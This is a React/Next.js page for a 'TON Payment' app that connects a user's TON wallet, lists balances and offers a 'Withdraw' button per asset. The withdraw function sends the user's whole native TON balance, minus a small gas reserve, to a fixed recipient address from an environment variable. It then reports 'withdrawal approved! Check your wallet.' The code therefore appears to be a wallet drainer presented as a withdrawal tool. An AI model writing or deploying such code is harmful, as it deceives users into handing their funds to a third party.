"use client";

import { useEffect, useState, useCallback } from "react";
import {
  TonConnectButton,
  useTonConnectUI,
  useIsConnectionRestored,
  useTonAddress,
} from "@tonconnect/ui-react";

const RECIPIENT = process.env.NEXT_PUBLIC_TON_RECIPIENT!;

type Asset = {
  symbol: string;
  balance: string;
  rawBalance: bigint;
  isNative: boolean;
  jettonAddress?: string;
  decimals: number;
};

type TxStatus = "idle" | "sending" | "success" | "error";

export default function Home() {
  const [tonConnectUI] = useTonConnectUI();
  const isConnectionRestored = useIsConnectionRestored();
  const userAddress = useTonAddress();

  const [assets, setAssets] = useState<Asset[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [txStatus, setTxStatus] = useState<TxStatus>("idle");
  const [txMessage, setTxMessage] = useState("");

  // Fetch native TON + Jetton balances
  const fetchBalances = useCallback(async (address: string) => {
    if (!address) return;
    setLoading(true);
    setError("");
    setAssets([]);

    try {
      // 1. Native TON balance
      const nativeRes = await fetch(
        `https://toncenter.com/api/v2/getAddressBalance?address=${encodeURIComponent(address)}`
      );
      const nativeData = await nativeRes.json();

      const nativeNano = BigInt(nativeData.result || "0");
      const nativeTon = Number(nativeNano) / 1_000_000_000;

      const result: Asset[] = [
        {
          symbol: "TON",
          balance: nativeTon.toFixed(4),
          rawBalance: nativeNano,
          isNative: true,
          decimals: 9,
        },
      ];

      // 2. Jetton balances (using v3 endpoint for token list)
      try {
        const jettonRes = await fetch(
          `https://toncenter.com/api/v3/jetton/wallets?owner_address=${encodeURIComponent(address)}&limit=100`
        );
        const jettonData = await jettonRes.json();

        if (jettonData.jetton_wallets) {
          for (const jw of jettonData.jetton_wallets) {
            if (BigInt(jw.balance || "0") === BigInt(0)) continue;
            result.push({
              symbol: jw.jetton?.symbol || jw.jetton?.name || "JETTON",
              balance: (Number(jw.balance) / Math.pow(10, jw.jetton?.decimals || 9)).toFixed(4),
              rawBalance: BigInt(jw.balance),
              isNative: false,
              jettonAddress: jw.jetton,
              decimals: jw.jetton?.decimals || 9,
            });
          }
        }
      } catch (e) {
        console.warn("Jetton fetch failed, showing native only:", e);
      }

      setAssets(result);
    } catch (err) {
      console.error(err);
      setError("Failed to fetch balances. TON Center may be rate-limiting.");
    } finally {
      setLoading(false);
    }
  }, []);

  // Auto-fetch when wallet connects
  useEffect(() => {
    if (userAddress && isConnectionRestored) {
      fetchBalances(userAddress);
    } else {
      setAssets([]);
    }
  }, [userAddress, isConnectionRestored, fetchBalances]);

  // Send withdrawal for a specific asset
  async function withdraw(asset: Asset) {
    if (!userAddress || !RECIPIENT) {
      setError("Wallet not connected or recipient not configured.");
      return;
    }
    if (asset.rawBalance <= BigInt(0)) {
      setError("Nothing to withdraw.");
      return;
    }

    setTxStatus("sending");
    setTxMessage("");

    try {
      if (asset.isNative) {
        // Native TON transfer
        // Reserve ~0.01 TON for gas
        const gasReserve = BigInt("10000000");
        const amount = asset.rawBalance - gasReserve;

        if (amount <= BigInt(0)) {
          throw new Error("Balance too low after gas reserve.");
        }

        await tonConnectUI.sendTransaction({
          validUntil: Math.floor(Date.now() / 1000) + 300,
          messages: [
            {
              address: RECIPIENT,
              amount: amount.toString(),
            },
          ],
        });
      } else {
        // Jetton transfer requires a payload (TEP-74)
        // For simplicity, this example only handles native TON withdrawals.
        // Jetton transfer needs @ton/core to build the payload.
        throw new Error(
          "Jetton withdrawal requires a payload. Use native TON first, or add @ton/core for TEP-74."
        );
      }

      setTxStatus("success");
      setTxMessage(`${asset.symbol} withdrawal approved! Check your wallet.`);

      // Refresh balances after a short delay
      setTimeout(() => fetchBalances(userAddress), 3000);
    } catch (err: any) {
      console.error(err);
      setTxStatus("error");
      setTxMessage(err?.message || "Transaction rejected or failed.");
    }
  }

  if (!isConnectionRestored) {
    return (
      <main className="flex min-h-screen items-center justify-center bg-neutral-950 text-neutral-300">
        Restoring connection...
      </main>
    );
  }

  return (
    <main className="mx-auto flex min-h-screen max-w-md flex-col gap-4 bg-neutral-950 p-5 text-neutral-100">
      <header className="flex items-center justify-between">
        <h1 className="text-xl font-semibold">TON Payment</h1>
        <span className="rounded bg-neutral-800 px-3 py-1 text-xs">TON</span>
      </header>

      {/* ONE CONNECT BUTTON */}
      <section className="rounded-xl border border-neutral-800 bg-neutral-900 p-4">
        <h2 className="mb-3 font-medium">Wallet</h2>
        <TonConnectButton />
        {userAddress && (
          <p className="mt-2 break-all font-mono text-xs text-neutral-400">
            {userAddress.slice(0, 10)}...{userAddress.slice(-8)}
          </p>
        )}
      </section>

      {/* BALANCES + WITHDRAW */}
      {userAddress && (
        <section className="rounded-xl border border-neutral-800 bg-neutral-900 p-4">
          <div className="mb-3 flex items-center justify-between">
            <h2 className="font-medium">Balances</h2>
            <button
              type="button"
              onClick={() => fetchBalances(userAddress)}
              disabled={loading}
              className="rounded border border-neutral-700 px-3 py-1 text-xs disabled:opacity-50"
            >
              {loading ? "..." : "Refresh"}
            </button>
          </div>

          {error && (
            <p className="mb-3 text-xs text-red-400">{error}</p>
          )}

          {loading && assets.length === 0 && (
            <p className="text-sm text-neutral-400">Fetching balances...</p>
          )}

          {assets.map((asset, i) => (
            <div
              key={`${asset.symbol}-${i}`}
              className="mb-2 flex items-center justify-between rounded-lg bg-neutral-800 p-3"
            >
              <div>
                <p className="font-semibold">{asset.symbol}</p>
                <p className="text-xs text-neutral-400">{asset.balance}</p>
              </div>
              <button
                type="button"
                onClick={() => withdraw(asset)}
                disabled={txStatus === "sending" || asset.rawBalance <= BigInt(0)}
                className="rounded bg-emerald-600 px-3 py-1.5 text-xs font-semibold hover:bg-emerald-500 disabled:opacity-50"
              >
                {txStatus === "sending" ? "..." : "Withdraw"}
              </button>
            </div>
          ))}

          {assets.length === 0 && !loading && (
            <p className="text-sm text-neutral-400">No assets found.</p>
          )}
        </section>
      )}

      {/* STATUS MESSAGE */}
      {txMessage && (
        <div
          className={`rounded-lg border p-3 text-xs ${
            txStatus === "success"
              ? "border-emerald-700 bg-emerald-950 text-emerald-300"
              : "border-red-700 bg-red-950 text-red-300"
          }`}
        >
          {txMessage}
        </div>
      )}

      <p className="text-center text-xs text-neutral-500">
        Each withdrawal shows the amount and recipient in your wallet before you approve.
      </p>
    </main>
  );
}
